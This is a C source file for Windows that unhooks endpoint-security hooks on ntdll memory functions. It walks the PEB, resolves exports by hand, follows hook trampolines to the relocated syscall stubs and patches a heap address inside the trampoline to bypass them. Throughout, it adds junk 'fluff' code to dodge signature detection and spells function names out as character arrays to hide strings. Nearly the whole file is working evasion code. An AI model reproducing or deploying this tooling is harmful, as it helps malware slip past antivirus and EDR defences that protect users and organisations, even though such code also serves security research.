#include <windows.h>
#include <stdio.h>
#include "structs.h"
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")

// Random fluff to break up easily detectable custom GetMod/GetProc
int expectedString(VOID * buf, int strSize) {
    if (IsTextUnicode(buf, strSize, NULL)) {
        CHAR * str = (CHAR *) buf;
        for (int i = 0; i < strSize; i++) {
            CharUpperW(str[i]);
        }
        return 2;
    }
    
    return 0;
}

HMODULE hlpGetModuleHandle(LPWSTR lpModule) {
    PEB * peb = (PEB *) __readgsqword(0x60);

    PEB_LDR_DATA * Ldr = (PEB_LDR_DATA *) peb->Ldr;
    LIST_ENTRY * pModuleList = &Ldr->InMemoryOrderModuleList;
    LIST_ENTRY * pListEntryFirst =  pModuleList->Flink;

    // --- Fluff ---
    WCHAR * name = L"licenseCompliance";
    CHAR * additional = "gplTaxonomy";
    if (expectedString(name, sizeof(name)) == 2) {
        int ret = 0;
        ret = expectedString(additional, sizeof(additional));

        if (ret != 0) {
            return NULL;
        }
    }
    // -------------

    for (
        LIST_ENTRY * pListEntry = pListEntryFirst;
        pListEntry != pModuleList;
        pListEntry = pListEntry->Flink
    ) {
        LDR_DATA_TABLE_ENTRY * pEntry = (LDR_DATA_TABLE_ENTRY *) ((BYTE *) pListEntry - sizeof(LIST_ENTRY));

        if (lpModule != NULL) {
            if (lstrcmpiW(pEntry->BaseDllName.Buffer, lpModule) == 0) {
                return pEntry->DllBase;
            }
        }
    }

    return NULL;
}

VOID * GetFunc(VOID * pModAddr, LPCSTR pFuncName) {
    VOID * pFuncAddr = NULL;
    BYTE * pBaseAddr = pModAddr;

    IMAGE_DOS_HEADER * pDosHeader = (IMAGE_DOS_HEADER *) pBaseAddr;
    IMAGE_NT_HEADERS * pNtHeaders = (IMAGE_NT_HEADERS32 *) (pBaseAddr + pDosHeader->e_lfanew);
    IMAGE_OPTIONAL_HEADER * pOptionalHeader = &pNtHeaders->OptionalHeader;

    // --- Fluff ---
    WCHAR * name = L"axaTriggerW";
    CHAR * additional = "axaTriggerA";
    if (expectedString(name, sizeof(name)) == 2) {
        int ret = 0;
        ret = expectedString(additional, sizeof(additional));

        if (ret != 0) {
            return NULL;
        }
    }
    // ------------

    IMAGE_DATA_DIRECTORY * pDataDir = (IMAGE_DATA_DIRECTORY *) &(pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]);
    IMAGE_EXPORT_DIRECTORY * pExportDir = (IMAGE_EXPORT_DIRECTORY *) (pBaseAddr + pDataDir->VirtualAddress);

    DWORD * pEAT = (DWORD *) (pBaseAddr + pExportDir->AddressOfFunctions);
    DWORD * pNames = (DWORD *) (pBaseAddr + pExportDir->AddressOfNames);
    WORD * pOrds = (WORD *) (pBaseAddr + pExportDir->AddressOfNameOrdinals);

    for (int i = 0; i < pExportDir->NumberOfNames; i++) {
        CHAR * pTempName = (CHAR *) pBaseAddr + (DWORD_PTR) pNames[i];

        WORD nameOrd = (WORD) pOrds[i];

        if (lstrcmpiA(pTempName, pFuncName) == 0) {
            pFuncAddr = (pBaseAddr + (DWORD_PTR) pEAT[nameOrd]);

            break;
        }
    }

    return pFuncAddr;
}

VOID * FindHook(VOID * pFunc, LPCSTR pFuncName) {
    BYTE * firstByte = (BYTE *) pFunc;

    // Crude check for mov r10,rcx to determine whether function is syscall stub, or fully implemented in module
    if (
        *firstByte != 0x4c ||
        *(firstByte + 1) != 0x8b ||
        *(firstByte + 2) != 0xd1
    ) {
        printf("[!] Unexpected bytes found at function starting at: %p\n", pFunc);
        return NULL;
    }

    BYTE * fourthByteAddr = firstByte + 3;
    if (
        *fourthByteAddr == 0xeb ||
        *fourthByteAddr == 0xe9 ||
        *fourthByteAddr == 0xff ||
        *fourthByteAddr == 0xea
    ) {
        return fourthByteAddr;
    } else {
        return NULL;
    }
}

VOID * ResolveJmp(BYTE * jmpAddr, VOID ** nextInstructionOut) {
    BYTE jmpOp = *jmpAddr;

    if (jmpOp == 0xe9) {
        BYTE * nextInstruction = jmpAddr + 5;
        DWORD offset = *((DWORD *) (jmpAddr + 1));

        if (nextInstructionOut != NULL) {
            *nextInstructionOut = nextInstruction;
        }

        return nextInstruction + offset;
    }

    if (jmpOp == 0xff) {
        VOID * nextInstruction = jmpAddr + 6;
        VOID * addr = (VOID *) *((DWORDLONG *) nextInstruction);

        if (nextInstructionOut != NULL) {
            *nextInstructionOut = nextInstruction;
        }

        return addr;
    }

    return NULL;
}

WORD FindRelocatedStub(VOID * addrToFind, VOID ** unhookAddr) {
    MEMORY_BASIC_INFORMATION info;

    for (
        BYTE * p = NULL;
        VirtualQueryEx(GetCurrentProcess(), p, &info, sizeof(info)) == sizeof(info);
        p += info.RegionSize
    ) {
        // Memory sections we want to include. In the example case, the section is COMMITTED/PRIVATE/RX
        if (info.State != MEM_COMMIT || info.Type != MEM_PRIVATE || info.Protect != PAGE_EXECUTE_READ) {
            continue;
        }

        // printf("Base Address: %p\n", info.BaseAddress);
        // printf("Allocation Base: %p\n", info.AllocationBase);
        // printf("Allocation protect: %x\n", info.AllocationProtect);
        // printf("Size of region: %x\n", info.RegionSize);
        // printf("State: %x\n", info.State);
        // printf("Protect: %x\n", info.Protect);
        // printf("Type: %x\n", info.Type);
        
        for (SIZE_T i = 0; i < (info.RegionSize - sizeof(VOID *)); i++) {
            VOID * checkBytes = (VOID *) *((DWORDLONG *) ((BYTE *) info.BaseAddress + i));

            if (checkBytes == addrToFind) {
                BYTE * finalJmpAddr = (BYTE *) info.BaseAddress + i;

                // Only walk back 100 bytes. If it's not found within that, we are probably in the wrong place.
                for (int backCounter = 1; backCounter < 100; backCounter++) {
                    if (
                        *((BYTE *) finalJmpAddr - backCounter) == 0x4c &&
                        *((BYTE *) ((finalJmpAddr - backCounter) + 1)) == 0x8b &&
                        *((BYTE *) ((finalJmpAddr - backCounter) + 2)) == 0xd1
                    ) { 
                        *unhookAddr = (BYTE *) finalJmpAddr - backCounter;
                        
                        WORD syscallID = *(WORD *)((BYTE *) ((finalJmpAddr - backCounter) + 4));
                        return syscallID;
                    }
                }
            }
        }
    }

    return NULL;
}

BOOL PatchHeapAddr(BYTE * landingAddr, VOID * targetAddr) {
    DWORD_PTR * patchAddr = NULL;
    BYTE * nextLanding = NULL;
    BYTE * nextInstruction = NULL;
    BYTE * initialHeapAddr = NULL;
    VOID * xorAddr1 = NULL;
    VOID * xorAddr2 = NULL;
    DWORD offset = 0;
    int stackValCounter = 0;

    // Count how many pushes to the stack are made before the jump
    while (*landingAddr == 0x51) {
        stackValCounter++;
        landingAddr++;
    }

    nextLanding = ResolveJmp(landingAddr, NULL);
    if (nextLanding == NULL) {
        return FALSE;
    }

    // Find the starting value of the heap address, pre-modification by the loop
    // To do this we find the value moved into r10. This is the address of the next instruction + an offset
    offset = *((DWORD *) (nextLanding + 3));
    nextInstruction = nextLanding + 7;
    xorAddr1 = (VOID *) *((DWORDLONG *) (nextInstruction + offset));

    // We then find the next value, which will be XOR'd with the first. We skip an instruction in the middle which isn't used in resolving the address.
    // Then it is also a case of the next instruction + an offset
    nextInstruction = nextInstruction + 6;
    offset = *((DWORD *) (nextInstruction + 3));
    nextInstruction = nextInstruction + 7;
    xorAddr2 = (VOID *) *((DWORDLONG *) (nextInstruction + offset));

    // XORing the two values gives us the initial address on the heap, before any modifications
    initialHeapAddr = ((DWORDLONG) xorAddr1) ^ ((DWORDLONG) xorAddr2);

    // We then perform the same actions the loop does, adding 0x45 for each value previously pushed to the stack, and adding 0x28 on the end.
    patchAddr = initialHeapAddr + (0x45 * (stackValCounter)) + 0x28;

    *patchAddr = targetAddr;

    return TRUE;
}

BOOL Unhook(WCHAR * modName, CHAR * funcName) {
    VOID * unhookModule = NULL;
    VOID * funcAddr = NULL;
    VOID * funcAddrToFind = NULL;

    BYTE * firstJmp = NULL;
    BYTE * firstLanding = NULL;
    VOID * unhookAddr = NULL;
    WORD syscallID = NULL;

    unhookModule = hlpGetModuleHandle(modName);
    if (unhookModule == NULL) {
        printf("Error retrieving base addr of module\n");
        return -1;
    }

    funcAddr = GetFunc(unhookModule, funcName);
    if (funcAddr == NULL) {
        printf("Error retrieving address of func");
        return -1;
    }

    firstJmp = FindHook(funcAddr, funcName);
    if (firstJmp == NULL) {
        return -1;
    }

    firstLanding = ResolveJmp(firstJmp, &funcAddrToFind);
    if (firstLanding == NULL) {
        printf("[!] Error resolving jmp\n");
        return -1;
    }

    syscallID = FindRelocatedStub(funcAddrToFind, &unhookAddr);
    if (unhookAddr == NULL) {
        printf("[!] Unable to find related stub\n");
        return -1;
    }

    printf("[!] Syscall ID: %x\n", syscallID);
    printf("[!] Final address to use for fix: %p\n", unhookAddr);

    PatchHeapAddr(firstLanding, unhookAddr);
}

int main(void) {
    // Function to unhook
    WCHAR modName[] = L"ntdll.dll";
    CHAR allocate[] = { 'Z', 'w', 'A', 'l', 'l', 'o', 'c', 'a', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', '\0' };
    CHAR protect[] = { 'N', 't', 'P', 'r', 'o', 't', 'e', 'c', 't', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', '\0' };

    if (!Unhook(modName, allocate)) {
        printf("[!] Error attempting to unhook function: %s\n", allocate);
        return -1;
    }

    if (!Unhook(modName, protect)) {
        printf("[!] Error attempting to unhook function: %s\n", protect);
        return -1;
    }

    puts("Press enter to allocate mem...");
    getchar();
    
    // Test to see if it's worked. Set a breakpoint on the NTDLL syscall stub and step through. After a couple of jumps, it will jump straight to the relocated syscall stub
    VOID * mem = NULL;
    DWORD oldProt = NULL;

    if (!(mem = VirtualAlloc(NULL, 100, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE))) {
        printf("Error allocating mem: %d\n", GetLastError());
        return -1;
    }

    printf("Location of mem: %p\nPress enter to change protections...\n", mem);
    getchar();
    
    if (!VirtualProtect(mem, 100, PAGE_EXECUTE_READ, &oldProt)) {
        printf("Error chaing protections: %d\n", GetLastError());
        return -1;
    }

    puts("End of program.");
    getchar();

    return 0;
}